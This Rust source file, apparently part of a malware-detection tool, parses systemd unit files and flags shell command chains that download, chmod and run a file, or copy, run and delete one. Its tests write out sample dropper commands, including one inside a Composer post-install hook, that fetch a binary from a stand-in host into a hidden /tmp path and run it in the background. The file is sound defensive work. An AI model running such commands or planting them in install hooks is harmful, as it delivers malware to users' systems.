//! Structured systemd unit fields. Parser migrated from cleave's KV fallback.
//! Repeated commands, list resets, quoting and continuations retain their semantics.
use crate::output::Values;
use serde_json::Value;

pub(crate) fn extract(bytes: &[u8], values: &mut Values) {
    if bytes.len() > 16 * 1024 * 1024 {
        return;
    }
    if let Some(root) = parse_systemd_service(bytes) {
        *values = Values::from_json(root);
        let commands = values.get("service.exec_start").cloned();
        let commands: Vec<&str> = match commands.as_ref() {
            Some(Value::String(s)) => vec![s],
            Some(Value::Array(a)) => a.iter().filter_map(Value::as_str).collect(),
            _ => Vec::new(),
        };
        let flows: Vec<Value> = commands
            .iter()
            .flat_map(|s| literal_shell_flows(s))
            .collect();
        values.insert_key(
            crate::value_key!("shell.literal_command_flows"),
            Value::Array(flows),
        );
    }
}

// Deliberately limited to a literal shell -c command and consecutive && stages.
// No evaluation of substitutions, functions, variables, pipes or quoted inner
// shell words: unsupported syntax supplies no flow evidence.
pub(crate) fn literal_shell_flows(command: &str) -> Vec<Value> {
    let argv = split_systemd_items(command);
    let [shell, flag, body] = argv.as_slice() else {
        return Vec::new();
    };
    if !matches!(
        shell.as_str(),
        "sh" | "bash" | "/bin/sh" | "/bin/bash" | "/usr/bin/sh" | "/usr/bin/bash"
    ) || flag != "-c"
    {
        return Vec::new();
    }
    let raw_body = command
        .trim()
        .strip_prefix(shell.as_str())
        .and_then(|s| s.trim_start().strip_prefix("-c"))
        .map(str::trim);
    if raw_body != Some(format!("'{body}'").as_str())
        && raw_body != Some(format!("\"{body}\"").as_str())
    {
        return Vec::new();
    }
    literal_shell_body_flows(body)
}

// Call only for a body in a known executable shell-command field. Inert
// descriptions, class-import values and comments must never reach this parser.
pub(crate) fn literal_shell_body_flows(body: &str) -> Vec<Value> {
    if body.len() > 64 * 1024 {
        return Vec::new();
    }
    if body.chars().any(|c| {
        matches!(
            c,
            '$' | '`' | '(' | ')' | '|' | ';' | '\'' | '"' | '\\' | '\n' | '\r'
        )
    }) {
        return Vec::new();
    }
    let stages: Vec<Vec<&str>> = body
        .split("&&")
        .map(|s| s.split_whitespace().collect())
        .collect();
    if stages.len() > 64 {
        return Vec::new();
    }
    let path_ok = |s: &str| {
        s.starts_with('/')
            && s.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"/._-".contains(&b))
            && !s.split('/').any(|s| s == ".." || s == ".")
    };
    let executable = |stage: &[&str], path: &str| {
        stage.first() == Some(&path)
            && stage
                .iter()
                .skip(1)
                .all(|s| matches!(*s, "&" | ">/dev/null" | "2>/dev/null" | "2>&1"))
    };
    let mut flows = Vec::new();
    for [first, middle, last] in stages.array_windows::<3>() {
        if first
            .first()
            .is_some_and(|s| matches!(*s, "curl" | "/usr/bin/curl"))
        {
            let output = first
                .array_windows()
                .find_map(|&[flag, path]| matches!(flag, "-o" | "--output").then_some(path));
            let url = first
                .iter()
                .find(|s| s.starts_with("https://") || s.starts_with("http://"));
            let mut curl_ok = true;
            let mut at = 1;
            while let Some(&arg) = first.get(at) {
                if matches!(arg, "-o" | "--output") {
                    at += 2;
                    continue;
                }
                if arg.starts_with("http://")
                    || arg.starts_with("https://")
                    || matches!(
                        arg,
                        "--silent"
                            | "--insecure"
                            | "--location"
                            | "--fail"
                            | "--show-error"
                            | "2>/dev/null"
                    )
                    || (arg.starts_with('-')
                        && arg.len() > 1
                        && arg[1..].bytes().all(|b| b"skLfS".contains(&b)))
                {
                    at += 1;
                    continue;
                }
                curl_ok = false;
                break;
            }
            if let (Some(path), Some(url)) = (output, url)
                && curl_ok
                && first
                    .iter()
                    .filter(|s| matches!(**s, "-o" | "--output"))
                    .count()
                    == 1
                && first
                    .iter()
                    .filter(|s| s.starts_with("http://") || s.starts_with("https://"))
                    .count()
                    == 1
                && path_ok(path)
                && matches!(
                    middle.as_slice(),
                    ["chmod" | "/bin/chmod" | "/usr/bin/chmod", "+x", target] if *target == path
                )
                && executable(last, path)
                && first.iter().all(|s| {
                    *s == "2>/dev/null"
                        || (!s.contains('&') && !s.contains('>') && !s.contains('<'))
                })
            {
                flows.push(serde_json::json!({"kind": if (path.starts_with("/tmp/.") || path.starts_with("/var/tmp/.") || path.starts_with("/dev/shm/.")) && last.last() == Some(&"&") { "hidden-temporary-download-chmod-background-exec" } else { "download-chmod-exec" }, "path":path, "url":url, "hidden_temporary": path.starts_with("/tmp/.") || path.starts_with("/var/tmp/.") || path.starts_with("/dev/shm/."), "curl_options": first.iter().filter(|s| s.starts_with('-')).collect::<Vec<_>>(), "download_stderr_target": if first.contains(&"2>/dev/null") { Some("/dev/null") } else { None }}));
            }
        }
        if first
            .first()
            .is_some_and(|s| matches!(*s, "cp" | "/bin/cp" | "/usr/bin/cp"))
        {
            let paths: Vec<&str> = first
                .iter()
                .copied()
                .skip(1)
                .filter(|s| !s.starts_with('-') && !s.starts_with("2>"))
                .collect();
            if let &[source, path] = paths.as_slice()
                && first.iter().skip(1).all(|s| {
                    path_ok(s) || matches!(*s, "-f" | "-r" | "-fr" | "-rf" | "--" | "2>/dev/null")
                })
                && path_ok(source)
                && path_ok(path)
                && executable(middle, path)
                && last
                    .first()
                    .is_some_and(|s| matches!(*s, "rm" | "/bin/rm" | "/usr/bin/rm"))
                && last.iter().skip(1).all(|s| {
                    path_ok(s) || matches!(*s, "-f" | "-r" | "-fr" | "-rf" | "--" | "2>/dev/null")
                })
                && last
                    .iter()
                    .skip(1)
                    .filter(|s| !s.starts_with('-') && !s.starts_with("2>"))
                    .copied()
                    .collect::<Vec<_>>()
                    == vec![path]
            {
                flows.push(
                    serde_json::json!({"kind":"copy-exec-delete", "source":source, "path":path}),
                );
            }
        }
    }
    flows
}

fn parse_systemd_service(content: &[u8]) -> Option<Value> {
    let text = std::str::from_utf8(content).ok()?;
    let mut root: serde_json::Map<String, Value> = serde_json::Map::new();
    let mut current_section: Option<String> = None;

    for line in collect_systemd_logical_lines(text) {
        let trimmed = line.trim();
        if let Some(section) = parse_systemd_section_header(trimmed) {
            current_section = Some(section);
            continue;
        }

        let Some(section_name) = current_section.as_deref() else {
            continue;
        };
        let Some(eq_pos) = line.find('=') else {
            continue;
        };

        let raw_key = line[..eq_pos].trim();
        if raw_key.is_empty() {
            continue;
        }
        let key = normalize_systemd_key(raw_key);
        if key.is_empty() {
            continue;
        }

        let raw_value = line[eq_pos + 1..].trim().to_string();
        let Some(section_obj) = ensure_json_object(&mut root, section_name) else {
            continue;
        };

        if raw_value.is_empty() && is_systemd_multi_value_key(&key) {
            clear_systemd_key(section_obj, &key);
            continue;
        }

        if key == "environment" {
            append_systemd_raw(section_obj, &key, raw_value.clone());
            let items = split_systemd_items(&raw_value);
            if !items.is_empty() {
                append_string_items(section_obj, "environment_list", items.clone());
                if let Some(env_obj) = ensure_json_object(section_obj, "environment") {
                    for item in items {
                        if let Some((name, value)) = item.split_once('=')
                            && !name.is_empty()
                        {
                            append_string_occurrence(env_obj, name, value.to_string());
                        }
                    }
                }
            }
            continue;
        }

        if is_systemd_command_key(&key) {
            append_systemd_raw(section_obj, &key, raw_value.clone());
            append_string_occurrence(section_obj, &key, raw_value);
            continue;
        }

        if is_systemd_token_list_key(&key) {
            append_systemd_raw(section_obj, &key, raw_value.clone());
            let items = split_systemd_items(&raw_value);
            if items.is_empty() {
                append_string_occurrence(section_obj, &key, raw_value);
            } else {
                append_string_items(section_obj, &key, items);
            }
            continue;
        }

        append_string_occurrence(section_obj, &key, raw_value);
    }

    if root.is_empty() {
        None
    } else {
        Some(Value::Object(root))
    }
}

fn collect_systemd_logical_lines(text: &str) -> Vec<String> {
    let mut lines = Vec::new();
    let mut current = String::new();
    let mut continuing = false;

    for raw_line in text.lines() {
        let line = raw_line.trim_end_matches('\r');
        let trimmed_start = line.trim_start();

        if !continuing
            && (trimmed_start.is_empty()
                || trimmed_start.starts_with('#')
                || trimmed_start.starts_with(';'))
        {
            continue;
        }

        if continuing
            && (trimmed_start.is_empty()
                || trimmed_start.starts_with('#')
                || trimmed_start.starts_with(';'))
        {
            continue;
        }

        let segment = if continuing { trimmed_start } else { line };
        let segment = segment.trim_end();
        let has_continuation = ends_with_unescaped_backslash(segment);
        let piece = if has_continuation {
            segment[..segment.len().saturating_sub(1)].trim_end()
        } else {
            segment
        };

        current.push_str(piece);

        if has_continuation {
            current.push(' ');
            continuing = true;
        } else {
            let logical = current.trim();
            if !logical.is_empty() {
                lines.push(logical.to_string());
            }
            current.clear();
            continuing = false;
        }
    }

    let trailing = current.trim();
    if !trailing.is_empty() {
        lines.push(trailing.to_string());
    }

    lines
}

fn ends_with_unescaped_backslash(s: &str) -> bool {
    let mut count = 0usize;
    for ch in s.chars().rev() {
        if ch == '\\' {
            count += 1;
        } else {
            break;
        }
    }
    count % 2 == 1
}

fn parse_systemd_section_header(line: &str) -> Option<String> {
    let inner = line.strip_prefix('[')?.strip_suffix(']')?.trim();
    if inner.is_empty() {
        None
    } else {
        Some(normalize_systemd_key(inner))
    }
}

fn normalize_systemd_key(raw: &str) -> String {
    let chars: Vec<char> = raw.chars().collect();
    let mut out = String::new();

    for (idx, ch) in chars.iter().enumerate() {
        if ch.is_ascii_alphanumeric() {
            let is_upper = ch.is_ascii_uppercase();
            let prev = idx.checked_sub(1).and_then(|i| chars.get(i));
            let next = chars.get(idx + 1);
            let prev_is_lower_or_digit =
                prev.is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit());
            let prev_is_upper = prev.is_some_and(char::is_ascii_uppercase);
            let next_is_lower = next.is_some_and(char::is_ascii_lowercase);

            if is_upper
                && !out.is_empty()
                && (prev_is_lower_or_digit || (prev_is_upper && next_is_lower))
            {
                out.push('_');
            }
            out.push(ch.to_ascii_lowercase());
        } else if (*ch == '-' || *ch == ' ' || *ch == '.' || *ch == '/')
            && !out.ends_with('_')
            && !out.is_empty()
        {
            out.push('_');
        }
    }

    out.trim_matches('_').to_string()
}

fn is_systemd_token_list_key(key: &str) -> bool {
    matches!(
        key,
        "after"
            | "before"
            | "wants"
            | "wanted_by"
            | "requires"
            | "required_by"
            | "requisite"
            | "binds_to"
            | "part_of"
            | "upholds"
            | "conflicts"
            | "also"
            | "alias"
            | "documentation"
            | "environment_file"
            | "pass_environment"
            | "unset_environment"
            | "read_write_paths"
            | "read_only_paths"
            | "inaccessible_paths"
            | "exec_paths"
            | "no_exec_paths"
            | "supplementary_groups"
            | "capability_bounding_set"
            | "ambient_capabilities"
            | "restrict_address_families"
            | "system_call_filter"
            | "system_call_architectures"
    )
}

fn is_systemd_command_key(key: &str) -> bool {
    matches!(
        key,
        "exec_start"
            | "exec_start_pre"
            | "exec_start_post"
            | "exec_reload"
            | "exec_stop"
            | "exec_stop_post"
    )
}

fn is_systemd_multi_value_key(key: &str) -> bool {
    key == "environment" || is_systemd_command_key(key) || is_systemd_token_list_key(key)
}

fn ensure_json_object<'a>(
    map: &'a mut serde_json::Map<String, Value>,
    key: &str,
) -> Option<&'a mut serde_json::Map<String, Value>> {
    if !map.contains_key(key) {
        map.insert(key.to_string(), Value::Object(serde_json::Map::new()));
    }
    map.get_mut(key)?.as_object_mut()
}

fn append_systemd_raw(section_obj: &mut serde_json::Map<String, Value>, key: &str, value: String) {
    if let Some(raw_obj) = ensure_json_object(section_obj, "_raw") {
        append_string_occurrence(raw_obj, key, value);
    }
}

fn append_string_occurrence(map: &mut serde_json::Map<String, Value>, key: &str, value: String) {
    let new_value = Value::String(value);
    match map.get_mut(key) {
        None => {
            map.insert(key.to_string(), new_value);
        }
        Some(Value::Array(arr)) => arr.push(new_value),
        Some(existing) => {
            let old = std::mem::replace(existing, Value::Null);
            *existing = Value::Array(vec![old, new_value]);
        }
    }
}

fn append_string_items<I>(map: &mut serde_json::Map<String, Value>, key: &str, items: I)
where
    I: IntoIterator<Item = String>,
{
    for item in items {
        append_string_occurrence(map, key, item);
    }
}

fn clear_systemd_key(section_obj: &mut serde_json::Map<String, Value>, key: &str) {
    section_obj.remove(key);
    if key == "environment" {
        section_obj.remove("environment_list");
        section_obj.remove("environment");
    }

    if let Some(raw_obj) = section_obj.get_mut("_raw").and_then(Value::as_object_mut) {
        raw_obj.remove(key);
        if raw_obj.is_empty() {
            section_obj.remove("_raw");
        }
    }
}

fn split_systemd_items(input: &str) -> Vec<String> {
    let mut items = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut chars = input.chars().peekable();
    let mut in_item = false;

    while let Some(ch) = chars.next() {
        match quote {
            Some(expected) => {
                if ch == expected {
                    quote = None;
                } else if ch == '\\' {
                    push_systemd_escape(&mut current, &mut chars);
                } else {
                    current.push(ch);
                }
                in_item = true;
            }
            None => match ch {
                ' ' | '\t' => {
                    if in_item {
                        items.push(std::mem::take(&mut current));
                        in_item = false;
                    }
                }
                '"' | '\'' if current.is_empty() => {
                    quote = Some(ch);
                    in_item = true;
                }
                '\\' => {
                    push_systemd_escape(&mut current, &mut chars);
                    in_item = true;
                }
                _ => {
                    current.push(ch);
                    in_item = true;
                }
            },
        }
    }

    if in_item {
        items.push(current);
    }

    items
}

fn push_systemd_escape(out: &mut String, chars: &mut std::iter::Peekable<std::str::Chars<'_>>) {
    let Some(next) = chars.next() else {
        out.push('\\');
        return;
    };

    match next {
        'a' => out.push('\u{0007}'),
        'b' => out.push('\u{0008}'),
        'f' => out.push('\u{000C}'),
        'n' => out.push('\n'),
        'r' => out.push('\r'),
        't' => out.push('\t'),
        'v' => out.push('\u{000B}'),
        '\\' => out.push('\\'),
        '"' => out.push('"'),
        '\'' => out.push('\''),
        's' => out.push(' '),
        'x' => push_radix_escape(out, chars, 16, 2, 'x'),
        'u' => push_unicode_escape(out, chars, 4, 'u'),
        'U' => push_unicode_escape(out, chars, 8, 'U'),
        '0'..='7' => push_octal_escape(out, chars, next),
        other => out.push(other),
    }
}

fn push_radix_escape(
    out: &mut String,
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    radix: u32,
    max_digits: usize,
    fallback_prefix: char,
) {
    let mut digits = String::new();
    while digits.len() < max_digits {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        if next.is_digit(radix) {
            digits.push(next);
            chars.next();
        } else {
            break;
        }
    }

    if digits.is_empty() {
        out.push(fallback_prefix);
        return;
    }

    if let Ok(value) = u32::from_str_radix(&digits, radix)
        && let Some(decoded) = char::from_u32(value)
    {
        out.push(decoded);
        return;
    }

    out.push(fallback_prefix);
    out.push_str(&digits);
}

fn push_unicode_escape(
    out: &mut String,
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    digits: usize,
    fallback_prefix: char,
) {
    let mut buf = String::new();
    while buf.len() < digits {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        if next.is_ascii_hexdigit() {
            buf.push(next);
            chars.next();
        } else {
            break;
        }
    }

    if buf.len() != digits {
        out.push(fallback_prefix);
        out.push_str(&buf);
        return;
    }

    if let Ok(value) = u32::from_str_radix(&buf, 16)
        && let Some(decoded) = char::from_u32(value)
    {
        out.push(decoded);
        return;
    }

    out.push(fallback_prefix);
    out.push_str(&buf);
}

fn push_octal_escape(
    out: &mut String,
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    first: char,
) {
    let mut digits = String::new();
    digits.push(first);
    while digits.len() < 3 {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        if ('0'..='7').contains(&next) {
            digits.push(next);
            chars.next();
        } else {
            break;
        }
    }

    if let Ok(value) = u32::from_str_radix(&digits, 8)
        && let Some(decoded) = char::from_u32(value)
    {
        out.push(decoded);
        return;
    }

    out.push_str(&digits);
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn literal_command_flow_requires_matching_paths_and_real_operations() {
        let download = "/bin/sh -c 'curl -skL https://example.test/x -o /tmp/.new-name && chmod +x /tmp/.new-name && /tmp/.new-name &'";
        let flows = literal_shell_flows(download);
        assert_eq!(flows.len(), 1);
        assert_eq!(flows[0]["hidden_temporary"], true);
        assert_eq!(
            literal_shell_flows(&download.replace("&& /tmp/.new-name &'", "&& /tmp/.other &'"))
                .len(),
            0
        );
        assert_eq!(
            literal_shell_flows(&download.replace("-skL", "--help")).len(),
            0
        );
        assert_eq!(
            literal_shell_flows(&download.replace("curl", "echo curl")).len(),
            0
        );
        assert_eq!(
            literal_shell_flows(&download.replace("&& /tmp/.new-name &'", "&& $payload &'")).len(),
            0
        );
        assert_eq!(
            literal_shell_flows(&download[..download.len() - 1]).len(),
            0
        );
        let copy = "/bin/bash -c 'cp -f -r -- /bin/input /bin/temp 2>/dev/null && /bin/temp >/dev/null 2>&1 && rm -rf -- /bin/temp 2>/dev/null'";
        assert_eq!(literal_shell_flows(copy)[0]["kind"], "copy-exec-delete");
        assert_eq!(
            literal_shell_flows(&copy.replace("&& /bin/temp >", "&& /bin/other >")).len(),
            0
        );
        assert_eq!(
            literal_shell_flows(&copy.replace("rm -rf", "rm --help")).len(),
            0
        );
    }

    #[test]
    fn composer_hook_flows_bind_paths_and_preserve_executable_context() {
        let command = "curl -skL https://example.test/x -o /tmp/.changed 2>/dev/null && chmod +x /tmp/.changed && /tmp/.changed &";
        let manifest = serde_json::json!({"scripts":{"post-install-cmd":[command]}});
        let mut values = Values::default();
        super::super::structured::extract_composer_json(
            &serde_json::to_vec(&manifest).unwrap(),
            &mut values,
        )
        .unwrap();
        let flows = values
            .get("composer.install_hook_flows")
            .unwrap()
            .as_array()
            .unwrap();
        assert_eq!(flows.len(), 1);
        assert_eq!(flows[0]["event"], "post-install-cmd");
        assert!(
            flows[0]["curl_options"]
                .as_array()
                .unwrap()
                .contains(&json!("-skL"))
        );
        assert_eq!(flows[0]["download_stderr_target"], "/dev/null");
        for manifest in [
            serde_json::json!({"description":command}),
            serde_json::json!({"scripts":{"test":command}}),
            serde_json::json!({"scripts":{"post-install-cmd":command.replace("&& /tmp/.changed &", "&& /tmp/.other &")}}),
            serde_json::json!({"scripts":{"post-install-cmd":command.replace("curl -skL", "echo curl -skL")}}),
            serde_json::json!({"scripts":{"post-install-cmd":command.replace("-skL", "--help")}}),
            serde_json::json!({"scripts":{"post-install-cmd":["curl -skL https://example.test/x -o /tmp/.changed", "chmod +x /tmp/.changed", "/tmp/.changed &"]}}),
        ] {
            let mut values = Values::default();
            super::super::structured::extract_composer_json(
                &serde_json::to_vec(&manifest).unwrap(),
                &mut values,
            )
            .unwrap();
            assert_eq!(
                values.get("composer.install_hook_flows").unwrap(),
                &serde_json::json!([])
            );
        }
        let manifest = serde_json::json!({"scripts":{"post-update-cmd":command}});
        let mut values = Values::default();
        super::super::structured::extract_composer_json(
            &serde_json::to_vec(&manifest).unwrap(),
            &mut values,
        )
        .unwrap();
        assert_eq!(
            values.get("composer.install_hook_flows").unwrap()[0]["event"],
            "post-update-cmd"
        );
    }

    #[test]
    fn sections_commands_resets_lists_and_continuations() {
        let bytes = b"# ignored\n[Unit]\nDescription=Example\nAfter=network.target syslog.target\n\
            [Install]\nWantedBy=multi-user.target\n[Service]\nUser=root\n\
            ExecStart=/bin/first\nExecStart=\nExecStart=/bin/sh -c \\\n            # continued comment\n  'echo hello'\nEnvironment=\"LABEL=hello world\" HEX=\\x41\n\
            Type=forking\nRestart=always\nKillMode=process\n";
        let mut values = Values::default();
        extract(bytes, &mut values);
        assert_eq!(values.get("service.user"), Some(&json!("root")));
        assert_eq!(
            values.get("service.exec_start"),
            Some(&json!("/bin/sh -c 'echo hello'"))
        );
        assert_eq!(
            values.get("service.environment.LABEL"),
            Some(&json!("hello world"))
        );
        assert_eq!(values.get("service.environment.HEX"), Some(&json!("A")));
        assert_eq!(
            values.get("unit.after"),
            Some(&json!(["network.target", "syslog.target"]))
        );
        assert_eq!(
            values.get("install.wanted_by"),
            Some(&json!("multi-user.target"))
        );
        assert_eq!(values.get("service.kill_mode"), Some(&json!("process")));
        for end in 0..bytes.len() {
            extract(&bytes[..end], &mut Values::default());
        }
    }
}
